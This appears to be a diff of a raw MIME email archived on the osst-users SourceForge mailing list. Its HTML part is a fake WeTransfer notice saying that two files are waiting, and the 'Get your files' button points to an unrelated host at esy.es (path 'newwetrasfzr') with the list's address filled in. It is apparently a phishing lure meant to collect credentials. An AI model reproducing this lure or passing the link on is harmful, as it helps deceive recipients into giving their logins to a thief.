+49x_main_heading_email_link"></span><br>You have =
+
+
+received a files via WeTransfer</td></tr>
+<tr id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35581" style=3D"font=
+-size: 15px; =
+
+
+color: rgb(33, 33, 33);">
+<td id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35580" class=3D"yiv2=
+956564175gmail-
+
+m_911891310866232251gmail-x_gmail-x_yiv6729642149x_files_details_td yiv2956=
+564175gmail-m_911891310866232251gmail-x_gmail-
+
+x_yiv6729642149x_unpadded_mobile" style=3D"margin: 0px; padding: 20px 80px =
+0px; font-size: 14px; width: 440px; color: rgb(145, =
+
+
+149, 153); outline-width: medium; outline-style: none; line-height: 23px;" =
+align=3D"center" valign=3D"top">2 files, 20 MB in total. =
+
+
+Will be deleted on 7th December, 2019</td></tr>
+<tr id=3D"yiv2956564175yui_3_16_0_ym19_1_1518589672456_8527" style=3D"font-=
+size: =
+
+
+15px; color: rgb(33, 33, 33);">
+<td id=3D"yiv2956564175yui_3_16_0_ym19_1_1518589672456_8526" class=3D"yiv29=
+56564175gmail-
+
+m_911891310866232251gmail-x_gmail-x_yiv6729642149x_button_outer_wrapper_td =
+yiv2956564175gmail-m_911891310866232251gmail-
+
+x_gmail-x_yiv6729642149x_unpadded_mobile" style=3D"margin: 0px; padding: 40=
+px 160px 0px; font-family: arial,sans-serif; width: =
+
+
+280px; outline-width: medium; outline-style: none;" align=3D"left" valign=
+=3D"top">
+<table =
+
+
+id=3D"yiv2956564175yui_3_16_0_ym19_1_1518589672456_8525" class=3D"yiv295656=
+4175gmail-m_911891310866232251gmail-x_gmail-
+
+x_yiv6729642149x_table_full_width yiv2956564175gmail-m_911891310866232251gm=
+ail-x_gmail-x_yiv6729642149x_button_table =
+
+
+yiv2956564175yahoo-compose-table-card" style=3D"margin: 0px; padding: 0px; =
+width: 280px; border-collapse: collapse; table-layout: =
+
+
+fixed; outline-width: medium; outline-style: none;" border=3D"0" cellpaddin=
+g=3D"0" cellspacing=3D"0">
+<tbody =
+
+
+id=3D"yiv2956564175yui_3_16_0_ym19_1_1518589672456_8524">
+<tr id=3D"yiv2956564175yui_3_16_0_ym19_1_1518589672456_8523">
+<td =
+
+
+id=3D"yiv2956564175yui_3_16_0_ym19_1_1518589672456_8522" style=3D"margin: 0=
+px; padding: 0px; font-family: arial,sans-serif; width: =
+
+
+280px; outline-width: medium; outline-style: none;" align=3D"left" valign=
+=3D"top"><a =
+
+
+id=3D"yiv2956564175yui_3_16_0_ym19_1_1518589672456_8521" class=3D"yiv295656=
+4175gmail-m_911891310866232251gmail-x_gmail-
+
+x_yiv6729642149x_button_anchor yiv2956564175gmail-m_911891310866232251gmail=
+-x_gmail-x_yiv6729642149x_button_2_anchor" =
+
+
+style=3D"padding: 15px 20px; font-size: 14px; text-decoration: underline; c=
+olor: rgb(255, 255, 255); text-align: center; display: =
+
+
+block; background-color: rgb(64, 159, 255);" href=3D"http://sgritrcsaonwaz.=
+esy.es/newwetrasfzr/index.php?email=3Dosst-users@lists.sourceforge.net" rel=
+=3D"nofollow" =
+
+
+target=3D"_top"><span id=3D"yiv2956564175yui_3_16_0_ym19_1_1518589672456_85=
+20">Get your =
+
+
+files</span></a></td></tr></tbody></table><!--!
+ TD--></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody=
+></table>
+<div style=3D"font-size: 13px; white-space: =
+
+
+normal; word-spacing: 0px; text-transform: none; font-weight: 400; color: r=
+gb(38, 40, 42); font-style: normal; letter-spacing: =
+
+
+normal; text-indent: 0px;"> </div>
+<div style=3D"font-size: 15px; white-space: normal; word-spacing: 0px; text=
+-transform: none; =
+
+
+font-weight: 400; color: rgb(33, 33, 33); font-style: normal; letter-spacin=
+g: normal; text-indent: 0px;"> </div></div></div><br =
+
+
+class=3D"Apple-interchange-newline"></html>
+--===============0857897956==--
+
+
+--===============3466196447267254775==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============5065056908925239873==
+--===============3466196447267254775==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -197,8 +504,5 @@ Osst-users mailing list
 Osst-users@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/osst-users
 
---===============5065056908925239873==--
-
-
-
+--===============3466196447267254775==--
 
